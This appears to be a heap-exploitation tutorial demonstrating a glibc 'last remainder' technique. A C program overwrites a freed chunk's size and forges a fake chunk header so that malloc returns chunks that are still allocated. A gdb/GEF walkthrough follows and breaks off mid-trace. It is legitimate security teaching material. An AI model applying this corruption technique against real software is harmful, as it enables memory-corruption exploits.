# Last Remainder

So the purpose of this, is we will leverage the main_arena's last_remainder, to reallocate heap chunks that have not been freed.

Here is the code for that:

```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x080
#define CHUNK_SIZE1 0x5f0
#define CHUNK_SIZE2 0x700
#define CHUNK_SIZE3 0x010

void main() {
    long *start_chunk,
            *end_chunk,
            *chunk0,
            *chunk1,
            *chunk2,
            *reallocated_chunk0,
            *reallocated_chunk1,
            *reallocated_chunk2;


    // The goal this time, will be to reallocate heap chunks, without freeing them.
    // We will do this via leveraging the main_arena last_remainder.
    // The last remainder is the leftover of a chunk allocated from the all bin searching.

    // Once there is a last_remainder, we will expand its size via overwriting the chunk header size
    // The expanded size will include the other chunks
    // Then we will just allocate from it, to get the other allocated chunks

    // Let's start off with allocating our chunks

    start_chunk = malloc(CHUNK_SIZE1);
    chunk0 = malloc(CHUNK_SIZE0);
    chunk1 = malloc(CHUNK_SIZE0);
    chunk2 = malloc(CHUNK_SIZE0);
    end_chunk = malloc(CHUNK_SIZE0);

    // Then we will free the 0x600 byte chunk, to insert it into the unsorted bin

    free(start_chunk);

    // Next we will move the chunk over to the large bin

    malloc(CHUNK_SIZE2);

    // Now that it is in the large bin, we will allocate from it, and get a last reminder

    malloc(CHUNK_SIZE3);

    // Now we will expand the size of the last_remainder chunk

    start_chunk[3] = 0x7a1;
    start_chunk[2] = 0x000;

    // We will need a chunk_header with the same prev_size (and prev_inuse flag not set)
    // Right after the expanded chunk, to pass checks

    end_chunk[0] = 0x7a0;
    end_chunk[1] = 0x080;

    // Next we will allocate an amount, to lineup the last_remainder
    // with chunk0

    malloc(0x5d0);

    // Now we will reallocate chunk0
    reallocated_chunk0 = malloc(CHUNK_SIZE0);

    // Now we will reallocate chunk1
    reallocated_chunk1 = malloc(CHUNK_SIZE0);

    // Now we will reallocate chunk2
    reallocated_chunk2 = malloc(CHUNK_SIZE0);

    printf("Did we reallocate chunk0:\t%s\n", (chunk0 == reallocated_chunk0) ? "Yes" : "No");
    printf("Did we reallocate chunk1:\t%s\n", (chunk1 == reallocated_chunk1) ? "Yes" : "No");
    printf("Did we reallocate chunk2:\t%s\n", (chunk2 == reallocated_chunk2) ? "Yes" : "No");
}
```

## Walkthrough

So for this, our goal will be to reallocate chunks `0-2`, leveraging the main arena's last remainder.

The last_remainder is a chunk, which is actually stored in the main_arena. The last_remainder is set, when a chunk is allocated using the all bin functionallity, and the remainder from that chunk is large enough to warrant a last_remainder. The last_remainder chunk will be inserted into the unsorted bin.

When the last_remainder chunk is the only chunk in the unsorted bin, malloc can actually continually break off smaller pieces of it, and allocate those smaller chunks. We will leverage this functionallity.

How we will accomplish our goal is by doing this. We will have a chunk, become the last_remainder, that is before the areas we want to allocate. We will expand it's size via overwriting the chunk size, to encompass the areas we want to allocate. Right after that chunk, we will set a fake chunk header, with a `prev_size` that matches our expanded last_remainder chunk size, and a chunk size that has the `prev_inuse` bit flag not set (and hopefully lines up with the next chunk, to avoid potential issues).

Then simply, we will first allocate a chunk from the last_remainder, to line it up with `chunk0` (`0x5d0`). Then, we will simply reallocate `chunk0/chunk1/chunk2` (they are all directly adjacent, no alignment allocations in between necissary).

Let's see this in action:

```
$   gdb ./last_remainder
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./last_remainder...
(No debugging symbols found in ./last_remainder)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001189 <+0>: endbr64
   0x000000000000118d <+4>: push   rbp
   0x000000000000118e <+5>: mov rbp,rsp
   0x0000000000001191 <+8>: sub rsp,0x40
   0x0000000000001195 <+12>:    mov edi,0x5f0
   0x000000000000119a <+17>:    call   0x1090 <malloc@plt>
   0x000000000000119f <+22>:    mov QWORD PTR [rbp-0x40],rax
   0x00000000000011a3 <+26>:    mov edi,0x80
   0x00000000000011a8 <+31>:    call   0x1090 <malloc@plt>
   0x00000000000011ad <+36>:    mov QWORD PTR [rbp-0x38],rax
   0x00000000000011b1 <+40>:    mov edi,0x80
   0x00000000000011b6 <+45>:    call   0x1090 <malloc@plt>
   0x00000000000011bb <+50>:    mov QWORD PTR [rbp-0x30],rax
   0x00000000000011bf <+54>:    mov edi,0x80
   0x00000000000011c4 <+59>:    call   0x1090 <malloc@plt>
   0x00000000000011c9 <+64>:    mov QWORD PTR [rbp-0x28],rax
   0x00000000000011cd <+68>:    mov edi,0x80
   0x00000000000011d2 <+73>:    call   0x1090 <malloc@plt>
   0x00000000000011d7 <+78>:    mov QWORD PTR [rbp-0x20],rax
   0x00000000000011db <+82>:    mov rax,QWORD PTR [rbp-0x40]
   0x00000000000011df <+86>:    mov rdi,rax
   0x00000000000011e2 <+89>:    call   0x1070 <free@plt>
   0x00000000000011e7 <+94>:    mov edi,0x700
   0x00000000000011ec <+99>:    call   0x1090 <malloc@plt>
   0x00000000000011f1 <+104>:   mov edi,0x10
   0x00000000000011f6 <+109>:   call   0x1090 <malloc@plt>
   0x00000000000011fb <+114>:   mov rax,QWORD PTR [rbp-0x40]
   0x00000000000011ff <+118>:   add rax,0x18
   0x0000000000001203 <+122>:   mov QWORD PTR [rax],0x7a1
   0x000000000000120a <+129>:   mov rax,QWORD PTR [rbp-0x40]
   0x000000000000120e <+133>:   add rax,0x10
   0x0000000000001212 <+137>:   mov QWORD PTR [rax],0x0
   0x0000000000001219 <+144>:   mov rax,QWORD PTR [rbp-0x20]
   0x000000000000121d <+148>:   mov QWORD PTR [rax],0x7a0
   0x0000000000001224 <+155>:   mov rax,QWORD PTR [rbp-0x20]
   0x0000000000001228 <+159>:   add rax,0x8
   0x000000000000122c <+163>:   mov QWORD PTR [rax],0x80
   0x0000000000001233 <+170>:   mov edi,0x5d0
   0x0000000000001238 <+175>:   call   0x1090 <malloc@plt>
   0x000000000000123d <+180>:   mov edi,0x80
   0x0000000000001242 <+185>:   call   0x1090 <malloc@plt>
   0x0000000000001247 <+190>:   mov QWORD PTR [rbp-0x18],rax
   0x000000000000124b <+194>:   mov edi,0x80
   0x0000000000001250 <+199>:   call   0x1090 <malloc@plt>
   0x0000000000001255 <+204>:   mov QWORD PTR [rbp-0x10],rax
   0x0000000000001259 <+208>:   mov edi,0x80
   0x000000000000125e <+213>:   call   0x1090 <malloc@plt>
   0x0000000000001263 <+218>:   mov QWORD PTR [rbp-0x8],rax
   0x0000000000001267 <+222>:   mov rax,QWORD PTR [rbp-0x38]
   0x000000000000126b <+226>:   cmp rax,QWORD PTR [rbp-0x18]
   0x000000000000126f <+230>:   jne 0x127a <main+241>
   0x0000000000001271 <+232>:   lea rax,[rip+0xd8c]     # 0x2004
   0x0000000000001278 <+239>:   jmp 0x1281 <main+248>
   0x000000000000127a <+241>:   lea rax,[rip+0xd87]     # 0x2008
   0x0000000000001281 <+248>:   mov rsi,rax
   0x0000000000001284 <+251>:   lea rax,[rip+0xd80]     # 0x200b
   0x000000000000128b <+258>:   mov rdi,rax
   0x000000000000128e <+261>:   mov eax,0x0
   0x0000000000001293 <+266>:   call   0x1080 <printf@plt>
   0x0000000000001298 <+271>:   mov rax,QWORD PTR [rbp-0x30]
   0x000000000000129c <+275>:   cmp rax,QWORD PTR [rbp-0x10]
   0x00000000000012a0 <+279>:   jne 0x12ab <main+290>
   0x00000000000012a2 <+281>:   lea rax,[rip+0xd5b]     # 0x2004
   0x00000000000012a9 <+288>:   jmp 0x12b2 <main+297>
   0x00000000000012ab <+290>:   lea rax,[rip+0xd56]     # 0x2008
   0x00000000000012b2 <+297>:   mov rsi,rax
   0x00000000000012b5 <+300>:   lea rax,[rip+0xd6d]     # 0x2029
   0x00000000000012bc <+307>:   mov rdi,rax
   0x00000000000012bf <+310>:   mov eax,0x0
   0x00000000000012c4 <+315>:   call   0x1080 <printf@plt>
   0x00000000000012c9 <+320>:   mov rax,QWORD PTR [rbp-0x28]
   0x00000000000012cd <+324>:   cmp rax,QWORD PTR [rbp-0x8]
   0x00000000000012d1 <+328>:   jne 0x12dc <main+339>
   0x00000000000012d3 <+330>:   lea rax,[rip+0xd2a]     # 0x2004
   0x00000000000012da <+337>:   jmp 0x12e3 <main+346>
   0x00000000000012dc <+339>:   lea rax,[rip+0xd25]     # 0x2008
   0x00000000000012e3 <+346>:   mov rsi,rax
   0x00000000000012e6 <+349>:   lea rax,[rip+0xd5a]     # 0x2047
   0x00000000000012ed <+356>:   mov rdi,rax
   0x00000000000012f0 <+359>:   mov eax,0x0
   0x00000000000012f5 <+364>:   call   0x1080 <printf@plt>
   0x00000000000012fa <+369>:   nop
   0x00000000000012fb <+370>:   leave  
   0x00000000000012fc <+371>:   ret    
End of assembler dump.
gef➤  b *main+109
Breakpoint 1 at 0x11f6
gef➤  b *main+114
Breakpoint 2 at 0x11fb
gef➤  b *main+175
Breakpoint 3 at 0x1238
gef➤  b *main+185
Breakpoint 4 at 0x1242
gef➤  b *main+199
Breakpoint 5 at 0x1250
gef➤  b *main+213
Breakpoint 6 at 0x125e
gef➤  b *main+218
Breakpoint 7 at 0x1263
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/unsorted_bin/last_remainder/last_remainder
warning: File "/home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
    add-auto-load-safe-path /home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1
line to your configuration file "/home/guy/.gdbinit".
To completely disable this security protection add
    set auto-load safe-path /
line to your configuration file "/home/guy/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
    info "(gdb)Auto-loading safe path"
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Breakpoint 1, 0x00005555555551f6 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559ae0  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x711           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf70  →  0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x700           
$rdi   : 0x10            
$rip   : 0x00005555555551f6  →  <main+109> call 0x555555555090 <malloc@plt>
$r8 : 0x3            
$r9 : 0x0            
$r10   : 0x100           
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c3  →  "/Hackery/shogun/pwn_demos/unsorted_bin/la[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf70│+0x0000: 0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120    ← $rsp
0x00007fffffffdf78│+0x0008: 0x00005555555598a0  →  0x0000000000000000
0x00007fffffffdf80│+0x0010: 0x0000555555559930  →  0x0000000000000000
0x00007fffffffdf88│+0x0018: 0x00005555555599c0  →  0x0000000000000000
0x00007fffffffdf90│+0x0020: 0x0000555555559a50  →  0x0000000000000000
0x00007fffffffdf98│+0x0028: 0x0000000000000000
0x00007fffffffdfa0│+0x0030: 0x0000000000000000
0x00007fffffffdfa8│+0x0038: 0x00007ffff7fe5080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551e7 <main+94>     mov edi, 0x700
   0x5555555551ec <main+99>     call   0x555555555090 <malloc@plt>
   0x5555555551f1 <main+104>    mov edi, 0x10
 → 0x5555555551f6 <main+109>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000010
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "last_remainder", stopped 0x5555555551f6 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551f6 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[71]: fw=0x555555559290, bk=0x555555559290
 →   Chunk(addr=0x5555555592a0, size=0x600, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  x/20g 0x555555559280
0x555555559280: 0x0 0x0
0x555555559290: 0x0 0x601
0x5555555592a0: 0x7ffff7e2d170  0x7ffff7e2d170
0x5555555592b0: 0x555555559290  0x555555559290
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
gef➤  p main_arena
$1 = {
  mutex = 0x0,
  flags = 0x0,
  have_fastchunks = 0x0,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x55555555a1e0,
  last_remainder = 0x0,
  bins = {0x7ffff7e2cd00 <main_arena+96>, 0x7ffff7e2cd00 <main_arena+96>, 0x7ffff7e2cd10 <main_arena+112>, 0x7ffff7e2cd10 <main_arena+112>, 0x7ffff7e2cd20 <main_arena+128>, 0x7ffff7e2cd20 <main_arena+128>, 0x7ffff7e2cd30 <main_arena+144>, 0x7ffff7e2cd30 <main_arena+144>, 0x7ffff7e2cd40 <main_arena+160>, 0x7ffff7e2cd40 <main_arena+160>, 0x7ffff7e2cd50 <main_arena+176>, 0x7ffff7e2cd50 <main_arena+176>, 0x7ffff7e2cd60 <main_arena+192>, 0x7ffff7e2cd60 <main_arena+192>, 0x7ffff7e2cd70 <main_arena+208>, 0x7ffff7e2cd70 <main_arena+208>, 0x7ffff7e2cd80 <main_arena+224>, 0x7ffff7e2cd80 <main_arena+224>, 0x7ffff7e2cd90 <main_arena+240>, 0x7ffff7e2cd90 <main_arena+240>, 0x7ffff7e2cda0 <main_arena+256>, 0x7ffff7e2cda0 <main_arena+256>, 0x7ffff7e2cdb0 <main_arena+272>, 0x7ffff7e2cdb0 <main_arena+272>, 0x7ffff7e2cdc0 <main_arena+288>, 0x7ffff7e2cdc0 <main_arena+288>, 0x7ffff7e2cdd0 <main_arena+304>, 0x7ffff7e2cdd0 <main_arena+304>, 0x7ffff7e2cde0 <main_arena+320>, 0x7ffff7e2cde0 <main_arena+320>, 0x7ffff7e2cdf0 <main_arena+336>, 0x7ffff7e2cdf0 <main_arena+336>, 0x7ffff7e2ce00 <main_arena+352>, 0x7ffff7e2ce00 <main_arena+352>, 0x7ffff7e2ce10 <main_arena+368>, 0x7ffff7e2ce10 <main_arena+368>, 0x7ffff7e2ce20 <main_arena+384>, 0x7ffff7e2ce20 <main_arena+384>, 0x7ffff7e2ce30 <main_arena+400>, 0x7ffff7e2ce30 <main_arena+400>, 0x7ffff7e2ce40 <main_arena+416>, 0x7ffff7e2ce40 <main_arena+416>, 0x7ffff7e2ce50 <main_arena+432>, 0x7ffff7e2ce50 <main_arena+432>, 0x7ffff7e2ce60 <main_arena+448>, 0x7ffff7e2ce60 <main_arena+448>, 0x7ffff7e2ce70 <main_arena+464>, 0x7ffff7e2ce70 <main_arena+464>, 0x7ffff7e2ce80 <main_arena+480>, 0x7ffff7e2ce80 <main_arena+480>, 0x7ffff7e2ce90 <main_arena+496>, 0x7ffff7e2ce90 <main_arena+496>, 0x7ffff7e2cea0 <main_arena+512>, 0x7ffff7e2cea0 <main_arena+512>, 0x7ffff7e2ceb0 <main_arena+528>, 0x7ffff7e2ceb0 <main_arena+528>, 0x7ffff7e2cec0 <main_arena+544>, 0x7ffff7e2cec0 <main_arena+544>, 0x7ffff7e2ced0 <main_arena+560>, 0x7ffff7e2ced0 <main_arena+560>, 0x7ffff7e2cee0 <main_arena+576>, 0x7ffff7e2cee0 <main_arena+576>, 0x7ffff7e2cef0 <main_arena+592>, 0x7ffff7e2cef0 <main_arena+592>, 0x7ffff7e2cf00 <main_arena+608>, 0x7ffff7e2cf00 <main_arena+608>, 0x7ffff7e2cf10 <main_arena+624>, 0x7ffff7e2cf10 <main_arena+624>, 0x7ffff7e2cf20 <main_arena+640>, 0x7ffff7e2cf20 <main_arena+640>, 0x7ffff7e2cf30 <main_arena+656>, 0x7ffff7e2cf30 <main_arena+656>, 0x7ffff7e2cf40 <main_arena+672>, 0x7ffff7e2cf40 <main_arena+672>, 0x7ffff7e2cf50 <main_arena+688>, 0x7ffff7e2cf50 <main_arena+688>, 0x7ffff7e2cf60 <main_arena+704>, 0x7ffff7e2cf60 <main_arena+704>, 0x7ffff7e2cf70 <main_arena+720>, 0x7ffff7e2cf70 <main_arena+720>, 0x7ffff7e2cf80 <main_arena+736>, 0x7ffff7e2cf80 <main_arena+736>, 0x7ffff7e2cf90 <main_arena+752>, 0x7ffff7e2cf90 <main_arena+752>, 0x7ffff7e2cfa0 <main_arena+768>, 0x7ffff7e2cfa0 <main_arena+768>, 0x7ffff7e2cfb0 <main_arena+784>, 0x7ffff7e2cfb0 <main_arena+784>, 0x7ffff7e2cfc0 <main_arena+800>, 0x7ffff7e2cfc0 <main_arena+800>, 0x7ffff7e2cfd0 <main_arena+816>, 0x7ffff7e2cfd0 <main_arena+816>, 0x7ffff7e2cfe0 <main_arena+832>, 0x7ffff7e2cfe0 <main_arena+832>, 0x7ffff7e2cff0 <main_arena+848>, 0x7ffff7e2cff0 <main_arena+848>, 0x7ffff7e2d000 <main_arena+864>, 0x7ffff7e2d000 <main_arena+864>, 0x7ffff7e2d010 <main_arena+880>, 0x7ffff7e2d010 <main_arena+880>, 0x7ffff7e2d020 <main_arena+896>, 0x7ffff7e2d020 <main_arena+896>, 0x7ffff7e2d030 <main_arena+912>, 0x7ffff7e2d030 <main_arena+912>, 0x7ffff7e2d040 <main_arena+928>, 0x7ffff7e2d040 <main_arena+928>, 0x7ffff7e2d050 <main_arena+944>, 0x7ffff7e2d050 <main_arena+944>, 0x7ffff7e2d060 <main_arena+960>, 0x7ffff7e2d060 <main_arena+960>, 0x7ffff7e2d070 <main_arena+976>, 0x7ffff7e2d070 <main_arena+976>, 0x7ffff7e2d080 <main_arena+992>, 0x7ffff7e2d080 <main_arena+992>, 0x7ffff7e2d090 <main_arena+1008>, 0x7ffff7e2d090 <main_arena+1008>, 0x7ffff7e2d0a0 <main_arena+1024>, 0x7ffff7e2d0a0 <main_arena+1024>, 0x7ffff7e2d0b0 <main_arena+1040>, 0x7ffff7e2d0b0 <main_arena+1040>, 0x7ffff7e2d0c0 <main_arena+1056>, 0x7ffff7e2d0c0 <main_arena+1056>, 0x7ffff7e2d0d0 <main_arena+1072>, 0x7ffff7e2d0d0 <main_arena+1072>, 0x7ffff7e2d0e0 <main_arena+1088>, 0x7ffff7e2d0e0 <main_arena+1088>, 0x7ffff7e2d0f0 <main_arena+1104>, 0x7ffff7e2d0f0 <main_arena+1104>, 0x7ffff7e2d100 <main_arena+1120>, 0x7ffff7e2d100 <main_arena+1120>, 0x7ffff7e2d110 <main_arena+1136>, 0x7ffff7e2d110 <main_arena+1136>, 0x7ffff7e2d120 <main_arena+1152>, 0x7ffff7e2d120 <main_arena+1152>, 0x7ffff7e2d130 <main_arena+1168>, 0x7ffff7e2d130 <main_arena+1168>, 0x7ffff7e2d140 <main_arena+1184>, 0x7ffff7e2d140 <main_arena+1184>, 0x7ffff7e2d150 <main_arena+1200>, 0x7ffff7e2d150 <main_arena+1200>, 0x7ffff7e2d160 <main_arena+1216>, 0x7ffff7e2d160 <main_arena+1216>, 0x555555559290, 0x555555559290, 0x7ffff7e2d180 <main_arena+1248>, 0x7ffff7e2d180 <main_arena+1248>, 0x7ffff7e2d190 <main_arena+1264>, 0x7ffff7e2d190 <main_arena+1264>, 0x7ffff7e2d1a0 <main_arena+1280>, 0x7ffff7e2d1a0 <main_arena+1280>, 0x7ffff7e2d1b0 <main_arena+1296>, 0x7ffff7e2d1b0 <main_arena+1296>, 0x7ffff7e2d1c0 <main_arena+1312>, 0x7ffff7e2d1c0 <main_arena+1312>, 0x7ffff7e2d1d0 <main_arena+1328>, 0x7ffff7e2d1d0 <main_arena+1328>, 0x7ffff7e2d1e0 <main_arena+1344>, 0x7ffff7e2d1e0 <main_arena+1344>, 0x7ffff7e2d1f0 <main_arena+1360>, 0x7ffff7e2d1f0 <main_arena+1360>, 0x7ffff7e2d200 <main_arena+1376>, 0x7ffff7e2d200 <main_arena+1376>, 0x7ffff7e2d210 <main_arena+1392>, 0x7ffff7e2d210 <main_arena+1392>, 0x7ffff7e2d220 <main_arena+1408>, 0x7ffff7e2d220 <main_arena+1408>, 0x7ffff7e2d230 <main_arena+1424>, 0x7ffff7e2d230 <main_arena+1424>, 0x7ffff7e2d240 <main_arena+1440>, 0x7ffff7e2d240 <main_arena+1440>, 0x7ffff7e2d250 <main_arena+1456>, 0x7ffff7e2d250 <main_arena+1456>, 0x7ffff7e2d260 <main_arena+1472>, 0x7ffff7e2d260 <main_arena+1472>, 0x7ffff7e2d270 <main_arena+1488>, 0x7ffff7e2d270 <main_arena+1488>, 0x7ffff7e2d280 <main_arena+1504>, 0x7ffff7e2d280 <main_arena+1504>, 0x7ffff7e2d290 <main_arena+1520>, 0x7ffff7e2d290 <main_arena+1520>, 0x7ffff7e2d2a0 <main_arena+1536>, 0x7ffff7e2d2a0 <main_arena+1536>, 0x7ffff7e2d2b0 <main_arena+1552>, 0x7ffff7e2d2b0 <main_arena+1552>, 0x7ffff7e2d2c0 <main_arena+1568>, 0x7ffff7e2d2c0 <main_arena+1568>, 0x7ffff7e2d2d0 <main_arena+1584>, 0x7ffff7e2d2d0 <main_arena+1584>, 0x7ffff7e2d2e0 <main_arena+1600>, 0x7ffff7e2d2e0 <main_arena+1600>, 0x7ffff7e2d2f0 <main_arena+1616>, 0x7ffff7e2d2f0 <main_arena+1616>, 0x7ffff7e2d300 <main_arena+1632>, 0x7ffff7e2d300 <main_arena+1632>, 0x7ffff7e2d310 <main_arena+1648>, 0x7ffff7e2d310 <main_arena+1648>, 0x7ffff7e2d320 <main_arena+1664>, 0x7ffff7e2d320 <main_arena+1664>, 0x7ffff7e2d330 <main_arena+1680>, 0x7ffff7e2d330 <main_arena+1680>, 0x7ffff7e2d340 <main_arena+1696>, 0x7ffff7e2d340 <main_arena+1696>, 0x7ffff7e2d350 <main_arena+1712>, 0x7ffff7e2d350 <main_arena+1712>, 0x7ffff7e2d360 <main_arena+1728>, 0x7ffff7e2d360 <main_arena+1728>, 0x7ffff7e2d370 <main_arena+1744>, 0x7ffff7e2d370 <main_arena+1744>, 0x7ffff7e2d380 <main_arena+1760>, 0x7ffff7e2d380 <main_arena+1760>, 0x7ffff7e2d390 <main_arena+1776>, 0x7ffff7e2d390 <main_arena+1776>, 0x7ffff7e2d3a0 <main_arena+1792>, 0x7ffff7e2d3a0 <main_arena+1792>, 0x7ffff7e2d3b0 <main_arena+1808>, 0x7ffff7e2d3b0 <main_arena+1808>, 0x7ffff7e2d3c0 <main_arena+1824>, 0x7ffff7e2d3c0 <main_arena+1824>, 0x7ffff7e2d3d0 <main_arena+1840>, 0x7ffff7e2d3d0 <main_arena+1840>, 0x7ffff7e2d3e0 <main_arena+1856>, 0x7ffff7e2d3e0 <main_arena+1856>, 0x7ffff7e2d3f0 <main_arena+1872>, 0x7ffff7e2d3f0 <main_arena+1872>, 0x7ffff7e2d400 <main_arena+1888>, 0x7ffff7e2d400 <main_arena+1888>, 0x7ffff7e2d410 <main_arena+1904>, 0x7ffff7e2d410 <main_arena+1904>, 0x7ffff7e2d420 <main_arena+1920>, 0x7ffff7e2d420 <main_arena+1920>, 0x7ffff7e2d430 <main_arena+1936>, 0x7ffff7e2d430 <main_arena+1936>, 0x7ffff7e2d440 <main_arena+1952>, 0x7ffff7e2d440 <main_arena+1952>, 0x7ffff7e2d450 <main_arena+1968>, 0x7ffff7e2d450 <main_arena+1968>, 0x7ffff7e2d460 <main_arena+1984>, 0x7ffff7e2d460 <main_arena+1984>, 0x7ffff7e2d470 <main_arena+2000>, 0x7ffff7e2d470 <main_arena+2000>, 0x7ffff7e2d480 <main_arena+2016>, 0x7ffff7e2d480 <main_arena+2016>, 0x7ffff7e2d490 <main_arena+2032>, 0x7ffff7e2d490 <main_arena+2032>, 0x7ffff7e2d4a0 <main_arena+2048>, 0x7ffff7e2d4a0 <main_arena+2048>, 0x7ffff7e2d4b0 <main_arena+2064>, 0x7ffff7e2d4b0 <main_arena+2064>, 0x7ffff7e2d4c0 <main_arena+2080>, 0x7ffff7e2d4c0 <main_arena+2080>, 0x7ffff7e2d4d0 <main_arena+2096>, 0x7ffff7e2d4d0 <main_arena+2096>, 0x7ffff7e2d4e0 <main_arena+2112>, 0x7ffff7e2d4e0 <main_arena+2112>},
  binmap = {0x0, 0x0, 0x100, 0x0},
  next = 0x7ffff7e2cca0 <main_arena>,
  next_free = 0x0,
  attached_threads = 0x1,
  system_mem = 0x21000,
  max_system_mem = 0x21000
}
```

So we see here, we have a large bin chunk `0x5555555592a0`. Since our request malloc size is `0x10`, and there are no other chunks in any of the heap bins, it will break off a `0x20` byte chunk from the large bin, and put the remainder in a unsorted bin chunk, and that will become the `last_remainder` (which is currently not set):

```
gef➤  c
Continuing.

Breakpoint 2, 0x00005555555551fb in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120  →  0x00007ffff7e2d110
$rbx   : 0x0             
$rcx   : 0x0000555555559290  →  0x0000000000000000
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf70  →  0x00005555555592a0  →  0x00007ffff7e2d170  →  0x00007ffff7e2d160  →  0x00007ffff7e2d150  →  0x00007ffff7e2d140  →  0x00007ffff7e2d130  →  0x00007ffff7e2d120
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x100           
$rdi   : 0x0000555555559290  →  0x0000000000000000
$rip   : 0x00005555555551fb  →  <main+114> mov rax, QWORD PTR [rbp-0x40]
$r8 : 0x2            
$r9 : 0x0            
$r10   : 0x100           
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c3  →  "/Hackery/shogun/pwn_demos/unsorted_bin/la[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
